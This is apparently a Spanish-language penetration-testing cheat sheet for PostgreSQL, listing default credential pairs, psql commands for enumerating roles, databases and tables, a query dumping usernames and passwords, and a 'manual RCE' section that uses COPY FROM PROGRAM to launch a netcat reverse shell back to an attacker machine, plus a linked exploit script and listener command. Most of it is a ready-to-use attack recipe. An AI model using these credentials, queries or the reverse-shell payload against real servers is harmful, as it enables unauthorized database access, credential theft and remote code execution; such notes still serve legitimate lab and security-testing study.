# PostgreSQL 

Tags: #PostgreSQL #SQLServer 


```bash 
Credenciales por defecto:
	postgres:postgres
	postgres:password
	postgres:admin
	admin:admin
	admin:password
```

## Comandos 

```bash 
❯ psql -h <IP> -U postgres -d postgres
	# h = IP de la DB
	# U = Usuario de la DB
	# d = Nombre de la DB. Por defecto es 'postgres'

❯ psql -h <IP> -p 5437 -U postgres -d postgres
	# p = Especificar un puerto 

	❯ SELECT version();
	❯ SELECT current_user; 
	❯ SELECT current_database();	
	
	❯ \du            # Ver usuarios/roles (Ver si eres 'Superuser')
	❯ \du+           # Más detallado 
	
	❯ \l             # Mirar las DBs
	❯ \c nombre_DB   # Conectarse a otra DB
	❯ \dt            # Ver las tablas de la DB actual 
	❯ \dt *.*        # Ver tablas de todos los schemas 
	❯ \dn            # Ver los schemas 
	❯ \d nombre_tabla   # Ver las columnas de una tabla 
	❯ \d+ nombre_tabla  # Más detallado 
	
	❯ SELECT * FROM nombre_tabla;
	❯ SELECT * FROM nombre_tabla LIMIT 10;
	❯ SELECT username,password FROM users;
	
	❯ \q             # Salir de la DB
```

## RCE Manual 

```bash 
# Dentro de la DB y siendo superuser 
❯ DROP TABLE IF EXISTS cmd_exec; 
❯ CREATE TABLE cmd_exec(cmd_output text);
❯ COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_Kali 80 >/tmp/f';

❯ rlwrap nc -nlvp 80           # Recibir la revershell 
```

## RCE 

* [PostgreeSQL - RCE](https://github.com/squid22/PostgreSQL_RCE)

```bash 
❯ python3 postgresql_rce.py    # Ejecutar el exploit 

❯ rlwrap nc -nlvp 80           # Recibir la revershell 
```